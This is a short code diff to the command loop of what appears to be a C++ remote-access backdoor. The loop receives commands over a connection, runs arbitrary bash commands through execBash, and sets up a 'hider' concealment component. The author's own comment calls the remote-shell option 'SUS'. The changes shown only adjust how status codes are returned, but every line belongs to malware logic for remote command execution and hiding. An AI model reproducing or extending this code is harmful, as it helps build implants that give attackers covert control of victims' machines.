@@ -58,7 +58,7 @@ std::string execBash(const char* cmd) {
 void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
-    Status res = SUCCSESS;
+    Status res = DID_NOTHING;
     command cmd;
 
     conn.recvCommand(cmd);
@@ -79,10 +79,11 @@ void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger
 
     case RUN_BASH:
         strRes = execBash(strParam.c_str()); // maybe we shoud abandon this option, it might be SUS
+        res = SUCCSESS;
         break;
 
     case HIDER_SETUP:
-        hiderManeger.setUpHider(strParam);
+        res = hiderManeger.setUpHider(strParam);
         break;
     }
     // hidden handling
